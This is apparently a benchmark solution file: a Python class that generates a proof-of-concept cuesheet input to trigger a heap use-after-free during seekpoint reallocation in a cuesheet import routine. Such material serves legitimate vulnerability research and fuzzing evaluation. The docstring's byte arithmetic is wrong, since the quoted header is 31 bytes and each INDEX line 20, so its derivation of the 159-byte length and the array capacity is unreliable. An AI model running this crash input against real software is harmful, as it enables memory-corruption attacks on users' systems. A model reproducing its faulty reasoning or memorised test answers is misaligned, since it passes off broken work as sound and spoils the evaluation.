class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap-use-after-free in the cuesheet import
        operation. It occurs when appending seekpoints, which can trigger a
        reallocation of the seekpoint array. A handle to the operation may
        continue to point to the old, freed memory.

        To trigger this, we create a cuesheet that adds multiple `INDEX`
        entries within a `TRACK`. The number of entries is chosen to exceed
        the initial capacity of the seekpoint array, forcing a `realloc`.

        Based on the ground-truth PoC length of 159 bytes, we can deduce the
        exact number of `INDEX` lines required.
        - Header `FILE "a.b" WAVE\nTRACK 01 AUDIO\n` is 33 bytes.
        - Each `  INDEX 01 00:00:00\n` line is 21 bytes.
        - To reach 159 bytes: (159 - 33) / 21 = 126 / 21 = 6 lines.
        This implies an initial capacity of 5 for the seekpoint array,
        with the 6th addition triggering the vulnerable reallocation.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # Cuesheet header
        header = b'FILE "a.b" WAVE\nTRACK 01 AUDIO\n'
        
        # Seekpoint entry to be repeated
        index_line = b'  INDEX 01 00:00:00\n'
        
        # Number of seekpoints to trigger realloc
        num_indices = 6
        
        # Construct the full PoC
        poc = header + (index_line * num_indices)
        
        return poc